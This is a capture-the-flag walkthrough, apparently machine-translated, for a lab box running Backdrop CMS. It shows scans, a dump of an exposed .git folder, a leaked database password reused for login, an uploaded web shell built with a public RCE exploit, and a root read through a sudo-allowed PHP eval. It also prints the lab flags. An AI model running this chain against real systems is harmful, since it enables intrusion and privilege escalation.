![[Pasted image 20250312221032.png]]
# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
nmap -p- 10.129.42.252                                                     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-12 20:38 CET
Nmap scan report for 10.129.42.252
Host is up (0.026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.54 seconds
```
### Detailed port scan

At the gedatialized port scan go to get more information from the services dien are open the ip address.

```
nmap -p22,80 -sCV 10.129.42.252 -vvvv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-12 20:39 CET
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:39
Completed NSE at 20:39, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:39
Completed NSE at 20:39, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:39
Completed NSE at 20:39, 0.00s elapsed
Initiating Ping Scan at 20:39
Scanning 10.129.42.252 [4 ports]
Completed Ping Scan at 20:39, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:39
Completed Parallel DNS resolution of 1 host. at 20:39, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 20:39
Scanning 10.129.42.252 [2 ports]
Discovered open port 22/tcp on 10.129.42.252
Discovered open port 80/tcp on 10.129.42.252
Completed SYN Stealth Scan at 20:39, 0.05s elapsed (2 total ports)
Initiating Service scan at 20:39
Scanning 2 services on 10.129.42.252
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
Completed Service scan at 20:39, 6.94s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.42.252.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:39
Completed NSE at 20:39, 1.92s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:39
Completed NSE at 20:39, 0.21s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:39
Completed NSE at 20:39, 0.00s elapsed
Nmap scan report for 10.129.42.252
Host is up, received echo-reply ttl 63 (0.019s latency).
Scanned at 2025-03-12 20:39:23 CET for 10s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-git: 
|   10.129.42.252:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
|_http-title: Home | Dog
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-robots.txt: 22 disallowed entries 
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
| /user/password /user/login /user/logout /?q=admin /?q=comment/reply 
| /?q=filter/tips /?q=node/add /?q=search /?q=user/password 
|_/?q=user/register /?q=user/login /?q=user/logout
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:39
Completed NSE at 20:39, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:39
Completed NSE at 20:39, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:39
Completed NSE at 20:39, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.61 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

Above you can see that there is a .git folder. I'm going to spoof it so I can go see what's in that .git folder. I will do this using the following command:

```
githacker --url http://10.129.42.252/.git/ --output-folder result

```

Within this folder I found a file settings.php. Within this file I found a usercredential.

```
at settings.php                                       
<?php
/**
 * @file
 * Main Backdrop CMS configuration file.
 */

/**
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';

```

Within the web browser I went into the .git folder to look at the logs and so there I came across the following email address.

dog@dog.htb

![[Pasted image 20250312204958.png]]
Now that I know this, I can look at the files that I just spoofed, in them we will look for mail with the name ...@dog.htb. For this I will use the following command.

```
grep -ri "dog.htb"                                               
files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

As you can see above we have found the user tiffany. Using these credentials we will be able to log in to the web page of dog.htb. So I will now start logging in using the following credentials that are in the table.

| username        | password            |
| --------------- | ------------------- |
| tiffany@dog.htb | BackDropJ2024DS2024 |
![[Pasted image 20250312212823.png]]

So now I started looking around this page a bit and I saw a post Available updates under the report tab. Within this tab I saw that the web page is running on backdrop version 1.27.1.

![[Pasted image 20250312213204.png]]

So I will now look for an exploit for this. In doing so, I have found the following exploit. https://www.exploit-db.com/exploits/52021
So now I went to execute this exploit by typing the following command.

```
 python3 exploit.py http://10.129.42.252
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://10.129.42.252/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://10.129.42.252/modules/shell/shell.php
```

So it says above that I have to go upload the .zip file at modules/install. So at the following URL you can manually go upload the file. http://10.129.42.252/?q=admin/installer/manual

![[Pasted image 20250312213714.png]]

When I want to start uploading the zip file I come up with an error message. This error message tells me that I can only start uploading files of the following file extensions:
- tar
- tgz
- gz
- bz2

![[Pasted image 20250312213914.png]]

So using the following command, I started changing the file type.

```
tar -cvf shell.tar shell/
```

So I will now upload the new shell.tar file. As you will see below I was able to upload the file properly now.

![[Pasted image 20250312214108.png]]

So now if you go to the url that that we got from the exploit you will then land on the following page.
![[Pasted image 20250312214429.png]]

So here we can now go and run a command to view the passwd file or other files. I went to see the passwd file so I can see who that is the user that we are going to be able to connect to the ssh server with. So now I went to run the following on that page.

![[Pasted image 20250312214612.png]]

As you can see above there is the user johncusack that that is the user that we will be able to connect to the ssh server with. I was able to connect to the ssh server by going with the following credentials.

| username   | password |
| ---------- | -------- |
| johncusack |          |
I started using this password because it was the only password I had found.

```
ssh johncusack@dog.htb   
johncusack@dog.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 12 Mar 2025 08:42:15 PM UTC

  System load:           0.11
  Usage of /:            49.2% of 6.32GB
  Memory usage:          19%
  Swap usage:            0%
  Processes:             229
  Users logged in:       0
  IPv4 address for eth0: 10.129.42.252
  IPv6 address for eth0: dead:beef::250:56ff:fe94:a82b


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

```

As you can now see above, I am connected to the ssh server and so I can now start viewing the first flag.

user flag = 5d49387d212bab31c0842b3caf5829b1

```
johncusack@dog:~$ cat user.txt 
5d49387d212bab31c0842b3caf5829b1
```

So now I went to see with the sudo -l command if there is not a path that I can execute as administrator. You can go and use the following path for running with sudo privileges.

```
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

After searching for what bee is, I was able to see that it is a tool that allows you to start managing the Web server from the command-line interface. It enables commands with PHP. So before executing the command we will have to go to the next path. This is before we can run the command.

The command sudo /usr/local/bin/bee ev “system(‘cat /root/root.txt’)” uses Bee to call a PHP system() function. This causes the system to execute the cat /root/root.txt command, displaying the contents of root.txt

Translated with DeepL.com (free version)

root flag = ecf2e9b9b2b097c1f609961a937fbc19

```
johncusack@dog:~$ cd /var/www/html/
johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee ev "system('cat /root/root.txt')"
ecf2e9b9b2b097c1f609961a937fbc19

```

ROOTED

![[Pasted image 20250312220400.png]]

